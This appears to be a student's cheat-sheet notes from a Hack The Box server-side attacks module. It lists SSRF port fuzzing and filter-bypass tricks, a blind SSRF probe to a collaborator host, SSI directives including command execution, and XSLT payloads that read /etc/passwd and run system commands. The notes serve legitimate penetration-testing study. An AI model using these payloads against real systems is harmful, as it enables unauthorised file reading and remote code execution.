![[Server_Side_Attacks_Module_Cheat_Sheet.pdf]]

# SSRF
## Port Discovery
```shell-session
alakin2504@htb[/htb]$ ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"

<SNIP>

[Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 0ms]
    * FUZZ: 3306
[Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 338ms]
    * FUZZ: 80
```

## URL Fuzzing
example: 192.168.0.FUZZ

## Blind SSRF in Referer Header
Just use Referer: https://r80jbhuq4svofeubo41rcv8hq8wzkp8e.oastify.com/

## Blacklisted SSRF WAF
- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md

#### Case Bypass![[Pasted image 20250410172855.png]]
## Redirection
Some applications perform local redirection instead of direct nagivation

We can exploit this to perform SSRF. Given a page has this redirection:
```
/product/nextProduct?path=...
```
And an API that fetches local API

```
product?....
```

https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

# SSTI
[[SSTI_ALL]]
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md

# SSI
Server-Side Includes (SSI) is a technology web applications use to create dynamic content on HTML pages. SSI is supported by many popular web servers such as [Apache](https://httpd.apache.org/docs/current/howto/ssi.html) and [IIS](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude). The use of SSI can often be inferred from the file extension. Typical file extensions include `.shtml`, `.shtm`, and `.stm`. However, web servers can be configured to support SSI directives in arbitrary file extensions. As such, we cannot conclusively conclude whether SSI is used only from the file extension.

=> STI leverages param vuln

| Print variables         | `<!--#printenv -->`                                  |
| ----------------------- | ---------------------------------------------------- |
| Change config           | `<!--#config errmsg="Error!" -->`                    |
| Print specific variable | `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->` |
| Execute command         | `<!--#exec cmd="whoami" -->`                         |
| Include web file        | `<!--#include virtual="index.html" -->`              |

# XSLT
## Verify XSLT Vuln
![[Pasted image 20250411111427.png]]

## Information Disclosure
```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

## Local File Inclusion (LFI) (XSLT ver2.0)
```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

## Local File Inclusion (LFI) (XSLT ver1.0)
```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

## Remote Code Execution (RCE)
```xml
<xsl:value-of select="php:function('system','id')" />
```
